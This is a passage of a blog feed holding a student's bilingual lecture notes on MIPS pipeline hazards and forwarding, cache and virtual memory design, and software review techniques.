&lt;li&gt;Information encoded in binary  &lt;ul&gt;
&lt;li&gt;Low voltage = 0, High voltage = 1  &lt;/li&gt;
&lt;li&gt;One wire per bit  &lt;/li&gt;
&lt;li&gt;Multi-bit data encoded on multi-wire buses  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Combinational element  &lt;ul&gt;
&lt;li&gt;Operate on data  &lt;/li&gt;
&lt;li&gt;Output is a function of input  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;State (sequential) elements  &lt;ul&gt;
&lt;li&gt;Store information  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Combinational Elements&lt;/h1&gt;
&lt;p&gt;AND gate, Adder, MUX, ALU  &lt;/p&gt;
&lt;h1&gt;Sequential Elements&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Register: stores data in circuit  &lt;ul&gt;
&lt;li&gt;Uses a clock signal to determine when to update the stored value  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Edge-triggered&lt;/strong&gt;: update when Clk changes from 0 to 1  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Performance Issues of Single Cycle Design&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Longest delay determines clock period  &lt;ul&gt;
&lt;li&gt;critical path: &lt;strong&gt;load instruction&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Clocking Methodology&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Combinational logic transforms data during clock cycles  &lt;ul&gt;
&lt;li&gt;Between clock edges  &lt;/li&gt;
&lt;li&gt;Input from state elements, output to state element  &lt;/li&gt;
&lt;li&gt;Longest delay determines clock period  &lt;ul&gt;
&lt;li&gt;&lt;img alt="clock period" src="/files/co-ch4-the-processor/clock_period.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Building a Datapath&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Datapath&lt;/strong&gt;: Elements that process data and addresses in the CPU. ex: Reg, ALU, MUX, Mem  &lt;/p&gt;
&lt;h1&gt;Instruction Fetch&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Instruction Fetch" src="/files/co-ch4-the-processor/instruction_fetch.png" /&gt;  &lt;/p&gt;
&lt;h1&gt;R-Format Instructions&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Read two register operands  &lt;/li&gt;
&lt;li&gt;Perform arithmetic/logical operation  &lt;/li&gt;
&lt;li&gt;Write register result  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Load/Store Instructions&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Load: Read memory and update register  &lt;/li&gt;
&lt;li&gt;Store: Write register value to memory  &lt;/li&gt;
&lt;li&gt;Read register operands  &lt;/li&gt;
&lt;li&gt;Calculate address using &lt;strong&gt;16-bit&lt;/strong&gt; offset  &lt;ul&gt;
&lt;li&gt;Use ALU, but &lt;strong&gt;sign-extend&lt;/strong&gt; offset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Hazards&lt;/h1&gt;
&lt;p&gt;Situations that prevent starting the next instruction in the next cycle  &lt;/p&gt;
&lt;h2&gt;Structure Hazards&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Conflict for use of a resource  &lt;/li&gt;
&lt;li&gt;In MIPS pipeline with a single memory  &lt;ul&gt;
&lt;li&gt;Load/store requires data access  &lt;/li&gt;
&lt;li&gt;Instruction fetch would have to stall for that cycle  &lt;ul&gt;
&lt;li&gt;Would cause a pipeline “bubble”  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pipelined datapaths require separate instruction/data memories or separate instruction/data caches  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Data Hazards&lt;/h2&gt;
&lt;p&gt;An instruction depends on completion of data access by a previous instruction  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Forwarding (aka Bypassing)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use result when it is computed  &lt;/li&gt;
&lt;li&gt;Don’t wait for it to be stored in a register  &lt;/li&gt;
&lt;li&gt;Requires extra connections in the datapath  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Load-Use Data Hazard  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Can’t always avoid stalls by forwarding  &lt;ul&gt;
&lt;li&gt;If value not computed when needed  &lt;/li&gt;
&lt;li&gt;Can’t forward backward in time!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Code Scheduling to Avoid Stalls  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Reorder code to avoid use of load result in the next instruction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Control Hazards&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Branch determines flow of control  &lt;ul&gt;
&lt;li&gt;Fetching next instruction depends on branch outcome  &lt;/li&gt;
&lt;li&gt;Pipeline can’t always fetch correct instruction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;In MIPS pipeline&lt;br /&gt;
Need to compare registers and compute target early in the pipeline&lt;br /&gt;
Add hardware to do it in ID stage  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Stall on Branch  &lt;ul&gt;
&lt;li&gt;Wait until branch outcome determined before fetching next instruction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Branch Prediction&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Pipeline Summary&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Pipelining improves performance by increasing instruction throughput  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Executes multiple instructions in parallel  &lt;/li&gt;
&lt;li&gt;Each instruction has the same latency  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Subject to hazards  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Structure  &lt;/li&gt;
&lt;li&gt;Data  &lt;/li&gt;
&lt;li&gt;Control  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Instruction set design affects complexity of pipeline implementation&lt;br /&gt;
￼￼  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;MIPS Pipelined Datapath&lt;/h1&gt;
&lt;p&gt;From left to right:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;IF: Instruction fetch  &lt;/li&gt;
&lt;li&gt;ID: Instruction decode / register file read  &lt;/li&gt;
&lt;li&gt;EX: Execute / address calculation  &lt;/li&gt;
&lt;li&gt;MEM: Memory Access  &lt;/li&gt;
&lt;li&gt;WB: Write Back  &lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;left to right flow leads to hazards  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Pipeline Registers&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Pipeline Registers" src="/files/co-ch4-the-processor/pipeline_registers.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Need registers between stages to hold information produced in previous cycle.  &lt;/li&gt;
&lt;li&gt;IF and ID are in different instruction cycle, so we need registers.  &lt;/li&gt;
&lt;li&gt;If some results in this stage won't be used in the next stages, we don't need store those results in the pipeline registers.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Pipeline Operation&lt;/h1&gt;
&lt;p&gt;Cycle-by-cycle flow of instructions through the pipelined datapath  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;“Single-clock-cycle”&lt;/strong&gt; pipeline diagram  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Shows pipeline usage in a single cycle  &lt;/li&gt;
&lt;li&gt;Highlight resources used  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;“multi-clock-cycle”&lt;/strong&gt; pipeline diagram  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Graph of operation over time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Corrected Datapath for Load&lt;/h1&gt;
&lt;p&gt;write address should be stored in the pipeline registers.&lt;br /&gt;
&lt;img alt="Corrected Datapath for Load" src="/files/co-ch4-the-processor/corrected_datapath_for_load.png" /&gt;  &lt;/p&gt;
&lt;h1&gt;Forwarding Paths&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Forwarding Unit  &lt;/li&gt;
&lt;li&gt;Control Unit  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Forwarding Conditions&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;// EX hazard  
if (EX/MEM.RegWrite &amp;amp;&amp;amp; (EX/MEM.RegisterRd != 0))  
{  
    if (EX/MEM.RegisterRd = ID/EX.RegisterRs) ForwardA = 10;  
    if (EX/MEM.RegisterRd = ID/EX.RegisterRt) ForwardB = 10;  
}  

// MEM hazard  
if (MEM/WB.RegWrite &amp;amp;&amp;amp; (MEM/WB.RegisterRd != 0))  
{  
    if (MEM/WB.RegisterRd = ID/EX.RegisterRs) ForwardA = 01;  
    if (MEM/WB.RegisterRd = ID/EX.RegisterRt) ForwardB = 01;  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Double Data Hazard&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="no"&gt;$1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;$1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;$2&lt;/span&gt;  
&lt;span class="no"&gt;add&lt;/span&gt; &lt;span class="no"&gt;$1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;$1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;$3&lt;/span&gt;  
&lt;span class="no"&gt;add&lt;/span&gt; &lt;span class="no"&gt;$1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;$1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;$4&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Both hazards occur -&amp;gt; Want to use the most recent  &lt;/li&gt;
&lt;li&gt;Revise MEM hazard condition -&amp;gt; Only fwd if EX hazard condition isn’t true  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Revised Forwarding Condition&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;// MEM hazard  
if (MEM/WB.RegWrite &amp;amp;&amp;amp; (MEM/WB.RegisterRd != 0))  
{  
    if ( !(EX/MEM.RegWrite &amp;amp;&amp;amp; (EX/MEM.RegisterRd != 0)  
    &amp;amp;&amp;amp; (EX/MEM.RegisterRd = ID/EX.RegisterRs)) )  
    {  
        if (MEM/WB.RegisterRd = ID/EX.RegisterRs) ForwardA = 01;  
    }  

    if ( !(EX/MEM.RegWrite &amp;amp;&amp;amp; (EX/MEM.RegisterRd != 0)  
    &amp;amp;&amp;amp; (EX/MEM.RegisterRd = ID/EX.RegisterRt)) )  
    {  
        if (MEM/WB.RegisterRd = ID/EX.RegisterRt) ForwardB = 01;  
    }  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Load-Use Hazard Detection&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Load-use hazard happens when  &lt;/span&gt;
&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EX&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemRead&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt;  
&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EX&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RegisterRt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RegisterRs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;EX&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RegisterRt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RegisterRt&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Check when using instruction is decoded in ID stage  &lt;/li&gt;
&lt;li&gt;If detected, stall and insert bubble  &lt;/li&gt;
&lt;li&gt;對一個 load word 的指令來說，我們要看的是他的 Rt  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;How to Stall the Pipeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Force control values in ID/EX register to 0  &lt;ul&gt;
&lt;li&gt;EX, MEM and WB do nop (no-operation)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prevent update of PC and IF/ID register  &lt;ul&gt;
&lt;li&gt;Using instruction is decoded again  &lt;/li&gt;
&lt;li&gt;Following instruction is fetched again  &lt;/li&gt;
&lt;li&gt;1-cycle stall allows MEM to read data for lw  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Stalls and Performance&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Stalls reduce performance  &lt;ul&gt;
&lt;li&gt;But are required to get correct results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compiler can arrange code to avoid hazards and stalls  &lt;ul&gt;
&lt;li&gt;Requires knowledge of the pipeline structure  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Reducing Branch Delay&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Move hardware to determine outcome to ID stage  &lt;ul&gt;
&lt;li&gt;Target address adder  &lt;/li&gt;
&lt;li&gt;Register comparator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: Branch taken  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;把 branch 決定的時間從 stage4 提早到 stage2,&lt;br /&gt;
在 stage2 才會知道這個 branch 是否會被 taken&lt;br /&gt;
決定的時間越早越好, 最早就是在 stage2 決定  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Data Hazards For Branches&lt;/h1&gt;
&lt;p&gt;If a comparison register is a destination of&lt;br /&gt;
+ 2nd or 3rd preceding ALU instruction&lt;br /&gt;
    + Can resolve using forwarding&lt;br /&gt;
+ preceding ALU instruction or 2nd preceding load instruction&lt;br /&gt;
    + Need 1 stall cycle&lt;br /&gt;
+ immediately preceding load instruction&lt;br /&gt;
    + Need 2 stall cycles  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Dynamic Branch Prediction&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;NOTE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Intel Sandy Bridge 的 pipeline 約有 17 個 stage  &lt;/li&gt;
&lt;li&gt;Intel Sandy Bridge 和 Ivy Bridge 是以色列的研發團隊研發的  &lt;/li&gt;
&lt;li&gt;Haswell 是美國團隊研發的  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Computer Organization"></category></entry><entry><title>CO Ch5 - Large and Fast Exploiting Memory Hierarchy</title><link href="https://blog.m157q.tw/posts/2013/11/25/co-ch5-large-and-fast-exploiting-memory-hierarchy/" rel="alternate"></link><published>2013-11-25T07:53:00+08:00</published><updated>2013-11-25T07:53:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-25:posts/2013/11/25/co-ch5-large-and-fast-exploiting-memory-hierarchy/</id><summary type="html">&lt;h1&gt;NCTUCS 2013-Fall Computer Organizaion by Professor Kai-Chiang Wu&lt;/h1&gt;
&lt;h1&gt;Ch5 - Large and Fast Exploiting Memory Hierarchy&lt;/h1&gt;
&lt;h2&gt;Memory Technology&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SRAM  &lt;/li&gt;
&lt;li&gt;DRAM  &lt;/li&gt;
&lt;li&gt;Williams-Kilburn tubes: 早期的 Memory 技術  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Memory Hierarchy Levels&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;教授：我去美國唸書的時候，教授都把 Cache Memory 直接簡寫成 $&lt;br /&gt;
所以之後我寫 $ 也是代表 Cache Memory  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;$ 在設計的時候通常都是跟 CPU 一起設計的，雖然他不在 CPU 裡面  &lt;/li&gt;
&lt;li&gt;CPU 透過 Mother board 上的 Bus 和 $ 交流資料  &lt;/li&gt;
&lt;li&gt;根據 Instruction Set 決定放在 $ 裡面的 Address 佔幾個 Word. (也就是設計 Block 的大小)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Cache Memory&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;除了 Register 以外，最接近 CPU 的 Memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Direct Mapped Cache&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;因為主記憶體比 Cache 大很多，無法直接全部對應到 Cache，所以必須有特殊的對應方法。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Direct mapped: only one choice  &lt;ul&gt;
&lt;li&gt;(Block address) modulo (#Blocks in cache)  &lt;ul&gt;
&lt;li&gt;Block 的位置除以 Cache 的 Block 總數後得到的餘數就是該 Block Address 要對應到的 Cache Address  &lt;/li&gt;
&lt;li&gt;其實沒有真的去作除法，直接看後面 3 個 bit (除以8得到的餘數，因為這裡的 cache 有 8 個)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;N-way associative: N choices  &lt;ul&gt;
&lt;li&gt;
&lt;h1&gt;Blocks is a power of 2&lt;/h1&gt;
&lt;/li&gt;
&lt;li&gt;Use low-order address bits  &lt;/li&gt;
&lt;li&gt;tag, index, offset(W.O., B.O.)  &lt;ul&gt;
&lt;li&gt;tag 代表了從 cache 如何找到該資料是存在哪個 block address  &lt;/li&gt;
&lt;li&gt;index 代表了該 block address 存在 cache 中的位置  &lt;/li&gt;
&lt;li&gt;offset 根據 block 大小不同而訂  &lt;ul&gt;
&lt;li&gt;W.O.: Word offset  &lt;/li&gt;
&lt;li&gt;B.O.: Byte offset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Tags and Valid Bits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Tag:  &lt;ul&gt;
&lt;li&gt;從 cache 如何找到該資料是存在哪個 block address  &lt;/li&gt;
&lt;li&gt;cache 也要存 tag，之後才知道要去找哪個 block  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Valid Bit  &lt;ul&gt;
&lt;li&gt;該 cache 無資料 =&amp;gt; 0  &lt;/li&gt;
&lt;li&gt;該 cache 有資料 =&amp;gt; 1  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Cache Example&lt;/h2&gt;
&lt;p&gt;見投影片 p.10 ~ p.15  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;22 =&amp;gt; 10110  &lt;ul&gt;
&lt;li&gt;tag =&amp;gt; 10  &lt;/li&gt;
&lt;li&gt;index =&amp;gt; 110  &lt;/li&gt;
&lt;li&gt;Hit/miss  &lt;ul&gt;
&lt;li&gt;要找的東西的 tag 和 index 有沒有已經存在 cache 中(tag 和 index 皆相同)  &lt;/li&gt;
&lt;li&gt;沒的話就是 miss, 有的話就是 hit  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Address Subdivision&lt;/h2&gt;
&lt;p&gt;見 p.16  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;byte address  &lt;/li&gt;
&lt;li&gt;2^n blocks  &lt;/li&gt;
&lt;li&gt;block data size 2^m words  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;聽不太懂  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Address Translation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Virtual Memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Page Fault Penalty&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Page Fault means that the data we find is not in the phyiscal address but disk storage.  &lt;/li&gt;
&lt;li&gt;Virtual Memory 經過 page table 查找後，無法在 Physical Address 找到，則為 Page Fault。  &lt;/li&gt;
&lt;li&gt;Page Fault 類似 cache 裡面的 miss  &lt;/li&gt;
&lt;li&gt;Millions of clock cycles (比 cache 的 panelty 大)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Page Tables&lt;/h2&gt;
&lt;p&gt;p.51  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Virtual Address (VA) -&amp;gt; Page Table (PT) -&amp;gt; Physical Address (PA)  &lt;/li&gt;
&lt;li&gt;page table entries (PTEs)  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;page table register&lt;/strong&gt; in CPU points to page table in physical memory  &lt;/li&gt;
&lt;li&gt;status bits  &lt;ul&gt;
&lt;li&gt;referenced  &lt;/li&gt;
&lt;li&gt;dirty - 先標記起來，之後讀寫  &lt;/li&gt;
&lt;li&gt;valid - 是不是真的有資料  &lt;ul&gt;
&lt;li&gt;If valid bit is zero, the page fault occurs and the data is not in the physical address but disk storage.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Every Page Table entry is 4 bytes.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Translation Using a Page Table&lt;/h2&gt;
&lt;p&gt;p.52  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We can know the amount of page offset by knowing 4 bytes per page table entry.  &lt;/li&gt;
&lt;li&gt;Virtual address(32 bits) = Virtual page number(32-x bits) + Page Offset(x bits)  &lt;ul&gt;
&lt;li&gt;x depends on the size of the page.  &lt;/li&gt;
&lt;li&gt;x is usually 12bits. (4KB per page)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Replacement and Writes&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;use least-recently used (LRU) to reduce page fault rate.  &lt;/li&gt;
&lt;li&gt;use dirty bit in PTE set when page is written to reduce the access to main memory.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Page Table Problems&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;page table is &lt;strong&gt;too big&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Access to page table is &lt;strong&gt;too slow&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Fast Translation Using a TLB&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;VA -&amp;gt; PT (in main memory) / TLB (in CPU for usually used) -&amp;gt; PA  &lt;/li&gt;
&lt;li&gt;Translation Look-aside Buffer (TLB)  &lt;ul&gt;
&lt;li&gt;use a fast cache of PTEs within the CPU  &lt;/li&gt;
&lt;li&gt;access to page tables has good &lt;strong&gt;time locality&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Extra misses occured when query in TLB failed. (queried data is in PT)  &lt;/li&gt;
&lt;li&gt;Those Misses could be handled by hardware or software  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Computer Organization"></category></entry><entry><title>ITSE Ch11 - Review Techniques</title><link href="https://blog.m157q.tw/posts/2013/11/25/itse-ch11-review-techniques/" rel="alternate"></link><published>2013-11-25T01:56:00+08:00</published><updated>2013-11-25T01:56:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-25:posts/2013/11/25/itse-ch11-review-techniques/</id><summary type="html">&lt;h1&gt;NCTUCS 2013-Fall Introduction to Software Engineering by Professor Feng-Jian Wang&lt;/h1&gt;
&lt;h1&gt;Ch11 - Review Techniques&lt;/h1&gt;
&lt;h2&gt;課前閒聊&lt;/h2&gt;
&lt;p&gt;SOA&lt;br /&gt;
CMMI  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Defect Amplification&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;每個階段都要有 Review  &lt;/li&gt;
&lt;li&gt;有經過 Review 的 Code 可以明顯有效的減少 Code 中的 Bug，避免掉很多產品釋出後的瑕疵  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Metrics&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Metrics 1" src="/files/itse-ch11-review-techniques/metrics1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="Metrics 2" src="/files/itse-ch11-review-techniques/metrics2.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Major Model Error: 會影響到 Database 中的資料、會影響到 Global 的變數、影響到程式邏輯的進行  &lt;/li&gt;
&lt;li&gt;Minor Model Error: User 覺得怪怪的，但不會影響到程式主要的進行。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;An Example&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;因為邏輯上彼此 Ambiguous 的關係，所以在 Review 的過程中，能找出的 Error 有限，通常能夠找出 30% 的 Error 已經算是很不錯的了  &lt;/li&gt;
&lt;li&gt;Minor Error 出現的次數通常會是 Major Error 的六倍左右  &lt;/li&gt;
&lt;li&gt;花在 Testing 的時間通常比 Review 多非常非常多  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Informal Reviews&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;a simple desk check  &lt;/li&gt;
&lt;li&gt;a casual meeting  &lt;/li&gt;
&lt;li&gt;the review-oriented aspects of pair programming  &lt;/li&gt;
&lt;li&gt;pair programming encourages continuous review as a work product (design or code) is created.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;FTR (Formal Technical Reviews)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Walkthroughs：從頭到尾執行一遍  &lt;/li&gt;
&lt;li&gt;Inspections：檢查規格是否符合  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Review Options Matrix&lt;/h2&gt;
&lt;p&gt;各種 Review 方法的比較表，直接看投影片 p.20 的圖表吧。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;SDRs (Sample-Driven Reviews)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;SDRs attempt to quantify those work products that are primary targets for full FTRs.&lt;/strong&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Metrics Derived from Reviews&lt;/h2&gt;
&lt;p&gt;總之就是各種衡量 Review 效果好不好的指標&lt;br /&gt;
